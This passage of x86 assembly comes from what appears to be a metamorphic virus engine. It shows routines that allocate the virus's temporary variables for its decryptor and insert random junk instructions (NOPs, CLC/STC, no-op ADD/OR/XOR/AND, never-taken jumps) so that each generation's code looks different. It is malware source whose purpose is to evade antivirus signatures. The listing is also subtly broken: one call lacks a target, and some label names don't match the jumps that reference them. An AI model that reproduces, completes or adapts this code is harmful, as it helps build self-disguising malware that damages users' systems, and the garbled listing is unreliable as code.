                            cmp     edx, 0F00h        ; last 100h bytes (a random offset
                            jb      Normal1           ; that we set at decryptor creation)
                            xor     edx, edx
                Add20:      add     edx, 20h
                Normal1:    add     edx, [ebp+virii_varmarkstable]
                            mov     eax, [edx]        ; Look if it's already marked.
                            or      eax, eax          ; If it is, Get the next one and
                            jz      VariableFound     ; look again.
                            sub     edx, [ebp+virii_varmarkstable]
                            add     edx, 8
                            jmp     VariableCheck
        VariableFound:                      ; When we find an unallocated one,
                            mov     eax, 1            ; we mark it.
                            mov     [edx], eax
                            sub     edx, [ebp+virii_varmarkstable]
                            call    random2            ; Now we get an internal random
                            and     eax, 3            ; offset from 0 to 3 and we add it
                            add     edx, eax          ; to the address.
                            mov     eax, [ebp+hooy_createDecryptor]
                            or      eax, eax
                            jz      Normal2           ; If we are making a decryptor, we
                            add     edx, [ebp+decryptor_data_sec] ; set no_reg as
                            mov     [ebp+xpand_virii_addition], edx        ; index register.
                            mov     eax, 8                       ; If not, we translate
                            jmp     Continue                     ; the delta register and
                  Normal2:  add     edx, [ebp+virii_newdatasec]  ; we set it, so the var
                            mov     [ebp+xpand_virii_addition], edx   ; is [DLT_REG+xxx]
                            mov     eax, [ebp+DeltaRegister]
                            call    Xpand_TranslateRegister
                Continue:   mov     [ebp+xpand_virii_mem1], eax  ; Set the index1 register
                            mov     eax, 8
                            mov     [ebp+xpand_virii_mem2], eax  ; Set the index2 as <no_reg>
                            pop     edx
                            ret

xpand_GetTempVar   endp

;; This function generates garbage instructions that will be eliminated by the
;; shrinker. They are compressed to NOPs.
xpand_InsertGarbage proc

                            call    random2
                            and     eax, 7             ; Get a random method
                            or      eax, eax
                            jz      MakeOneByter       ; Make a one byte instruction
                            cmp     eax, 1
                            jz      MakeMOVRegReg      ; Make MOV Reg,Reg (the same reg)
                            cmp     eax, 2
                            jz      MakeANDs1          ; Make AND Reg,-1
                            cmp     eax, 3
                            jz      MakeOR0            ; Make OR Reg,0
                            cmp     eax, 4
                            jz      MakeXOR0           ; Make XOR Reg,0
                            cmp     eax, 5
                            jz      MakeADD0           ; Make ADD Reg,0
                            cmp     eax, 6
                            jz      MakeCMPJcc         ; Make CMP Reg,Reg/Jcc (Jcc never
                                                    ; jumps)
                            jmp     xpand_InsertGarbage   ; Select another if 7

            MakeADD0:
                            xor     eax, eax           ; Set the operation ADD
                            mov     [ebp+xpand_operate], eax
            MakeOP0:
                            xor     eax, eax           ; Imm = 0
                            mov     [ebp+xpand_virii_immediate], eax
            MakeOPx:
                            xor     eax, eax           ; Set 0 at the field of labels
                            mov     [edi+0Bh], eax
                            mov     [edi+0Ch], esi     ; Set the instruction pointer
                            xor     eax, eax
                            mov     [ebp+xpand_32bits], eax  ; Set "32 bits"
            MakeOPReg0:
                            call    random2          ; Get a random register. It must not
                            and     eax, 7          ; be ESP nor the delta register
                            cmp     eax, 4
                            jz      MakeOPReg0
                            cmp     eax, [ebp+xpand_translateregister]
                            jz      MakeOPReg0
                            mov     [ebp+xpand_register], eax ; Set the register and make
                            call    xpand_GenOPRegImm         ; the operation
                            ret

            MakeOR0:
                            mov     eax, 8            ; Set operation OR
                            mov     [ebp+xpand_operate], eax
                            jmp     MakeOP0

            MakeXOR0:
                            mov     eax, 30h          ; Set operation XOR
                            mov     [ebp+xpand_operate], eax
                            jmp     MakeOP0

            MakeANDs1:
                            mov     eax, 20h          ; Set operation AND
                            mov     [ebp+xpand_operate], eax
                            mov     eax, -1           ; Set -1 as Immediate
                            mov     [ebp+xpand_virii_immediate], eax
                            jmp     MakeOPx


            MakeCMPJcc:
                            call    random2         ; Get a register to compare
                            and     eax, 7         ; If ESP or delta, we jump to make
                            cmp     eax, 4         ; other type of garbage. It's better
                            jz      MakeADD0       ; to not use this much, because then
                            cmp     eax, [ebp+xpand_translateregister] ; the code uses too
                            jz      MakeADD0       ; many jumps in future generations (in
                                                ; the third dimension :).
                            mov     [ebp+xpand_register], eax    ; Set the same register as
                            mov     [ebp+xpand_virii_srcreg], eax ; source and destiny
                            xor     eax, eax
                            mov     [ebp+xpand_32bits], eax   ; Set 32 bits size
                            mov     [edi+0Bh], eax        ; Clear the label flag and set
                            mov     [edi+0Ch], esi        ; the pointer
                            mov     eax, 38h              ; CMP Reg,Reg
                            mov     [ebp+xpand_operate], eax
                            call    xpand_GenOPRegReg        ; Generate the operation
                            call    xpand_GetSpecialJcc      ; Get a special Jcc that never
                            mov     [ebp+xpand_operate], eax ; jumps
            OtherLabel:
                            call                        ; Get a random label from the
                            and     eax, 01F8h            ; list of labels
                            cmp     eax, [ebp+virii_numberOfLabel]
                            jae     OtherLabel
                            add     eax, [ebp+virii_labeltable] ; Make it jump there (in theory)
                            mov     [ebp+xpand_virii_immediate], eax
                            call    xpand_GenJcc_SingleJcc   ; Generate a single Jcc
                            ret

        @@MakeMOVRegReg:
                            call    random2          ; Get a random register
                            and     eax, 7
                            cmp     eax, 4
                            jz      MakeMOVRegReg
                            cmp     eax, [ebp+xpand_translateregister]
                            jz      MakeMOVRegReg
                            mov     [ebp+xpand_register], eax   ; Set it as source & dest.
                            mov     [ebp+xpand_virii_srcreg], eax
                            xor     eax, eax
                            mov     [ebp+xpand_32bits], eax      ; Set 32 bits size
                            mov     [edi+0Bh], eax
                            mov     [edi+0Ch], esi    ; Clear label and set pointer
                            mov     eax, 40h
                            mov     [ebp+xpand_operate], eax ; Make MOV Reg,Reg
                            call    xpand_GenOPRegReg
                            ret

        @@MakeOneByter:
                            call    randomboolean    ; Get random TRUE or FALSE
                            or      eax, eax
                            jz      OnlyNOP          ; If FALSE, make a NOP
                            call    random2
                            and     eax, 0100h       ; Get CLC or STC
                            add     eax, 0F8FDh      ; Set the instruction as a direct
                            jmp     OtherOneByter    ; byte
                OnlyNOP:    mov     eax, 90FDh       ; Set NOP
    OtherOneByter:
                            mov     [edi], eax       ; Set the instruction
                            xor     eax, eax
                            mov     [edi+0Bh], eax   ; Clear the "label-on" flag
                            mov     [edi+0Ch], esi   ; Set the pointer
                            add     edi, 10h
                            call    random2           ; Select if we make again other
                            and     eax, 0Fh         ; random byte (a prob. of 1/16)
                            or      eax, eax
                            jz      MakeOneByter
                            ret

xpand_InsertGarbage endp

;;
;;
;; End of the expander
;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;; ********************************************************************** ;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;